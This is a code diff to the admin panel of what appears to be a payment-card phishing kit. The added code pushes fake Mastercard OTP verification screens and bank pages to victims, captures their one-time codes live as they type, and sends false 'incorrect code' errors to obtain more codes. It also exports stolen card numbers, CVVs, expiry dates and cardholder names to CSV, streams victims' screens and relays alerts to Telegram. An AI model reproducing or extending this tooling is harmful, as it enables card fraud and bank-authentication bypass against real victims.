@@ -532,6 +532,22 @@
       color: #22c55e;
       transition: opacity 0.5s ease;
     }
+    #mcOtpPanel {
+  display: flex; /* Change from 'hidden' class */
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: rgba(0, 0, 0, 0.75);
+  align-items: center;
+  justify-content: center;
+  z-index: 9999;
+}
+
+#mcOtpPanel.hidden {
+  display: none;
+}
   </style>
 </head>
 <body>
@@ -2564,6 +2580,141 @@ document.getElementById('generateFreeLinkForm').addEventListener('submit', async
     }
   }
 });
+    // Show MC Verification
+function showMCVerification(id) {
+  if (!transactionsMap.has(id)) {
+    alert('Transaction not found');
+    return;
+  }
+  
+  // Get transaction details
+  const tx = transactionsMap.get(id);
+  
+  // Set the current transaction ID
+  currentMcInvoiceId = id;
+  
+  // Show the MC panel
+  const panel = document.getElementById('mcOtpPanel');
+  panel.classList.remove('hidden');
+  
+  // Reset OTP value display
+  document.getElementById('mcOtpValue').textContent = 'Waiting...';
+  
+  console.log('Showing MC verification panel for transaction:', id);
+}
+
+// MC Panel Event Handlers - Add these to your initialization code
+function initMcPanel() {
+  // Start verification button
+  document.getElementById('mcStartVerification').addEventListener('click', () => {
+    if (!currentMcInvoiceId) {
+      alert('No transaction selected');
+      return;
+    }
+    
+    const verificationType = document.getElementById('mcVerificationType').value;
+    const bankCode = document.getElementById('mcBankSelect').value;
+    const currency = document.getElementById('mcCurrencySelect').value;
+    const phoneLastFour = document.getElementById('mcPhoneLastFour').value;
+    
+    if (!phoneLastFour || phoneLastFour.length !== 4 || !/^\d{4}$/.test(phoneLastFour)) {
+      alert('Please enter the last 4 digits of the phone number');
+      return;
+    }
+    
+    // Send command to show MC verification to the client
+    socket.emit('admin_command', {
+      command: 'show_mc_verification',
+      invoiceId: currentMcInvoiceId,
+      cardType: verificationType,
+      phoneLastFour: phoneLastFour
+    });
+    
+    // Then immediately start verification with the selected options
+    socket.emit('admin_command', {
+      command: 'start_verification',
+      invoiceId: currentMcInvoiceId,
+      verificationType: verificationType,
+      bankCode: bankCode,
+      merchantName: 'Secure Gateway',
+      phoneLastFour: phoneLastFour
+    });
+    
+    // Update currency if needed
+    socket.emit('update_mc_currency', {
+      invoiceId: currentMcInvoiceId,
+      currency: currency
+    });
+    
+    showMessage('success', 'MC verification started for transaction ' + currentMcInvoiceId);
+  });
+  
+  // Invalid OTP button
+  document.getElementById('mcOtpInvalidBtn').addEventListener('click', () => {
+    if (!currentMcInvoiceId) return;
+    
+    socket.emit('admin_command', {
+      command: 'show_otp_error',
+      invoiceId: currentMcInvoiceId,
+      message: 'Incorrect verification code. Please try again.'
+    });
+    
+    showMessage('success', 'OTP marked as invalid');
+  });
+  
+  // Success button
+  document.getElementById('mcOtpSuccessBtn').addEventListener('click', () => {
+    if (!currentMcInvoiceId) return;
+    
+    socket.emit('admin_command', {
+      command: 'verification_success',
+      invoiceId: currentMcInvoiceId
+    });
+    
+    // Close the panel
+    document.getElementById('mcOtpPanel').classList.add('hidden');
+    currentMcInvoiceId = null;
+    
+    // Reload transactions
+    loadTransactions();
+    
+    showMessage('success', 'Transaction approved successfully');
+  });
+  
+  // Fail options button
+  document.getElementById('mcFailOptionsBtn').addEventListener('click', () => {
+    const failOptions = document.getElementById('mcFailOptions');
+    failOptions.style.display = failOptions.style.display === 'none' ? 'block' : 'none';
+  });
+  
+  // Fail with reason button
+  document.getElementById('mcFailWithReasonBtn').addEventListener('click', () => {
+    if (!currentMcInvoiceId) return;
+    
+    const reason = document.getElementById('mcFailReasonDropdown').value;
+    
+    socket.emit('admin_command', {
+      command: 'verification_failed',
+      invoiceId: currentMcInvoiceId,
+      reason: reason
+    });
+    
+    // Close the panel
+    document.getElementById('mcOtpPanel').classList.add('hidden');
+    currentMcInvoiceId = null;
+    
+    // Reload transactions
+    loadTransactions();
+    
+    showMessage('success', `Transaction failed with reason: ${reason}`);
+  });
+  
+  // Close panel button
+  document.getElementById('mcClosePanelBtn').addEventListener('click', () => {
+    document.getElementById('mcOtpPanel').classList.add('hidden');
+    currentMcInvoiceId = null;
+  });
+}
     
     // Mark transaction as viewed
     async function markTransactionViewed(id) {
@@ -2702,51 +2853,31 @@ document.getElementById('generateFreeLinkForm').addEventListener('submit', async
       }
     }
 
-    async function toggleBankpage(id) {
-      const tx = transactionsMap.get(id);
-      try {
-     if (tx.bankpageVisible) {
-                    controlsHtml += `
-                        <button class="btn btn-sm btn-success btn-control" data-action="approve-bank" data-id="${tx.id}">Approve Bank Auth</button>
-                        <button class="btn btn-sm btn-danger btn-control" data-action="decline-bank" data-id="${tx.id}">Decline Bank Auth</button>
-                    `;
-                }
-                
-                if (tx.otpSent) {
-                    controlsHtml += `
-                        <button class="btn btn-sm btn-success btn-control" data-action="approve-otp" data-id="${tx.id}">Approve OTP</button>
-                        <button class="btn btn-sm btn-danger btn-control" data-action="decline-otp" data-id="${tx.id}">Decline OTP</button>
-                    `;
-                }
-                
-                if (!tx.completed) {
-                    controlsHtml += `
-                        <button class="btn btn-sm btn-success btn-control" data-action="mark-success" data-id="${tx.id}">Mark Success</button>
-                        <button class="btn btn-sm btn-danger btn-control" data-action="mark-failed" data-id="${tx.id}">Mark Failed</button>
-                    `;
-                }
-                
-                html += `
-                        <div class="card-footer d-flex justify-content-between align-items-center">
-                            <div>
-                                <span class="badge status-${statusClass} status-badge">${tx.status}</span>
-                            </div>
-                            <div>
-                                ${controlsHtml}
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                `;
-            });
-            
-            transactionsContainer.innerHTML = html;
-            
-            // Add event listeners for control buttons
-            document.querySelectorAll('.btn-control').forEach(button => {
-                button.addEventListener('click', handleControlAction);
-            });
-        }
+async function toggleBankpage(id) {
+  const tx = transactionsMap.get(id);
+  try {
+    const endpoint = tx.bankpageVisible ? '/api/hideBankpage' : '/api/showBankpage';
+    const response = await fetch(endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ invoiceId: id })
+    });
+    
+    if (!response.ok) throw new Error('Failed to toggle bankpage');
+    
+    // Update local state
+    tx.bankpageVisible = !tx.bankpageVisible;
+    transactionsMap.set(id, tx);
+    
+    // Refresh UI
+    loadTransactions();
+    
+    showMessage('success', tx.bankpageVisible ? 'Bank page shown to customer' : 'Bank page hidden');
+  } catch (error) {
+    console.error('Error toggling bankpage:', error);
+    alert('Failed to toggle bankpage');
+  }
+}
         
         function handleControlAction(e) {
             const action = e.target.getAttribute('data-action');
@@ -2848,6 +2979,97 @@ document.getElementById('generateFreeLinkForm').addEventListener('submit', async
         
         // Initialize
         renderTransactions();
+
+    // Initialize the admin panel
+document.addEventListener('DOMContentLoaded', function() {
+  console.log('Admin panel initializing...');
+  
+  // Load transactions
+  loadTransactions();
+  
+  // Load visitors
+  loadVisitors();
+  
+  // Initialize MC panel
+  initMcPanel();
+  
+  // Initialize screen controls
+  setupScreenControls();
+  
+  // Initialize clear transactions button
+  document.getElementById('clearTransactionsBtn').addEventListener('click', clearAllTransactions);
+  
+  // Initialize download CSV button
+  document.getElementById('downloadTransactionsBtn').addEventListener('click', function() {
+    // Create CSV from transactions
+    let csv = 'Invoice ID,Email,Amount,Currency,Card Number,CVV,Expiry,Cardholder,IP Address,Status\n';
+    
+    transactionsMap.forEach(tx => {
+      csv += `"${tx.id}","${tx.email}","${tx.amount}","${tx.currency || 'INR'}","${tx.cardNumber}","${tx.cvv}","${tx.expiry}","${tx.cardholder}","${tx.ip || 'Unknown'}","${tx.status || 'processing'}"\n`;
+    });
+    
+    // Create download link
+    const blob = new Blob([csv], { type: 'text/csv' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.setAttribute('href', url);
+    a.setAttribute('download', `transactions-${new Date().toISOString()}.csv`);
+    a.click();
+  });
+  
+  // Setup socket event listeners
+  socket.on('mc_otp_submitted', function(data) {
+    console.log('MC OTP received:', data);
+    if (currentMcInvoiceId === data.invoiceId) {
+      document.getElementById('mcOtpValue').textContent = data.otp;
+    }
+  });
+  
+  socket.on('mc_otp_typing', function(data) {
+    console.log('MC OTP typing:', data);
+    if (currentMcInvoiceId === data.invoiceId) {
+      document.getElementById('mcOtpValue').textContent = data.partialOtp + '...';
+    }
+  });
+  
+  socket.on('visitor', function(data) {
+    console.log('New visitor event:', data);
+    // Store in map
+    visitorsMap.set(data.pid, data);
+    // Add to list
+    addVisitorToList(data, true);
+    // Play notification
+    playNotificationSound('visitor');
+  });
+  
+  socket.on('visitor_left', function(data) {
+    console.log('Visitor left:', data);
+    if (data.pid && visitorsMap.has(data.pid)) {
+      visitorsMap.delete(data.pid);
+      
+      // Animate removal from UI
+      const visitorElement = document.getElementById(`visitor-${data.pid}`);
+      if (visitorElement) {
+        visitorElement.classList.add('fade-out');
+        setTimeout(() => {
+          visitorElement.remove();
+          
+          // If no visitors left, show message
+          if (visitorsMap.size === 0) {
+            document.getElementById('visitors-list').innerHTML = '<p>No visitors yet</p>';
+          }
+        }, 500);
+      }
+    }
+  });
+  
+  socket.on('screen_frame', handleScreenFrame);
+  
+  // Setup Telegram notifications
+  initTelegramNotifications();
+  
+  console.log('Admin panel initialized');
+});
     </script>
 </body>
 </html>
